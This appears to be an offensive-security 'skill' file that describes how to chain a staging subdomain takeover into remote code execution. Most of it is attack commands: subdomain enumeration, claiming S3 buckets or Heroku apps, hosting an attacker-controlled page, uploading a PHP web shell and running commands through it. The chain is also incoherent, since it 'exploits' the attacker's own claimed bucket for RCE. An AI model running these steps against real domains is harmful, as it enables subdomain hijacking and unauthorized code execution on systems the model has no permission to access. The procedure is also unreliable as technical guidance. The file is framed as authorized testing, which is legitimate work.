---
name: staging-takeover-rce
description: Chain staging subdomain takeover → app access → RCE via misconfig
version: 1.0.0
phase: chains
category: chaining
tags: [subdomain-takeover, staging, rce, misconfiguration, cloud]
tools: [curl]
difficulty: advanced
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - subdomain-discovery
  - webshell-deploy
  - cloud-iam-enum
mitre_attack:
  - T1199
  - T1190
  - T1059
---

## When to Use

Use this skill when a staging subdomain (staging.*, dev.*, test.*) points to
an external service (Heroku, GitHub Pages, S3) that can be claimed. Chain
subdomain takeover → application access → RCE via deployment misconfiguration.

## Prerequisites

- curl
- Staging subdomain identified (DNS points to claimable service)
- Service allows claiming (expired Heroku app, deleted S3 bucket, etc.)
- Application on staging has RCE vectors (debug mode, file upload, etc.)

## Procedure

```bash
# STEP 1: Identify staging subdomains
dig staging.TARGET.com +short
dig dev.TARGET.com +short
dig test.TARGET.com +short

# STEP 2: Check if subdomain points to claimable service
curl -sk -I "https://staging.TARGET.com" 2>/dev/null | head -10
# Look for: Heroku, GitHub Pages, S3, Azure, Fastly error pages

# STEP 3: Verify takeover is possible
# For Heroku: heroku apps:create unique-name
# For S3: aws s3 mb s3://staging-TARGET-com
# For GitHub Pages: create repo matching subdomain

# STEP 4: Claim the subdomain (varies by service)
# Example — S3 bucket takeover:
aws s3 mb s3://staging-target-com --region us-east-1

# Example — Heroku takeover:
heroku apps:create staging-target-com

# STEP 5: Host application on claimed service
echo '<h1>Staging</h1><form action="/upload" method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit"></form>' > /tmp/index.html
aws s3 cp /tmp/index.html s3://staging-target-com/index.html
aws s3 website s3://staging-target-com --index-document index.html

# STEP 6: Access staging application
curl -sk "https://staging.TARGET.com/"

# STEP 7: Exploit staging misconfiguration for RCE
# If staging has debug mode enabled:
curl -sk "https://staging.TARGET.com/debug/console"
curl -sk "https://staging.TARGET.com/_profiler"

# If staging has file upload:
curl -sk -X POST "https://staging.TARGET.com/upload" \
  -F "file=@/tmp/shell.php;filename=shell.php"

# STEP 8: Verify RCE on staging
curl -sk "https://staging.TARGET.com/shell.php?cmd=id"
```

## OPSEC Rules

- **CRITICAL**: Subdomain takeover affects production DNS — document carefully
- Do not serve malicious content on claimed subdomain
- Revert DNS changes after assessment
- Document all takeover attempts for remediation
- Do not access production data via staging
- Clean up claimed services after assessment

## Verification

- Confirm subdomain points to claimable service
- Verify takeover succeeds (subdomain serves your content)
- Test staging application functionality
- Confirm RCE via staging misconfiguration

## Pitfalls

- DNS TTL may delay takeover verification
- Some services require domain verification (CNAME)
- Staging may have different security controls than production
- Takeover may be detected by monitoring systems
- Some services block claiming of corporate domains
- Staging may be air-gapped from production

## Output Format

```
[CHAIN] Staging Takeover → RCE chain successful
  Step 1: staging.TARGET.com → points to deleted Heroku app
  Step 2: Subdomain takeover successful (Heroku claimed)
  Step 3: Staging application serves attacker content
  Step 4: Debug mode enabled (/debug/console accessible)
  Step 5: RCE confirmed via debug console (www-data)
  Severity: CRITICAL (9.5)
```
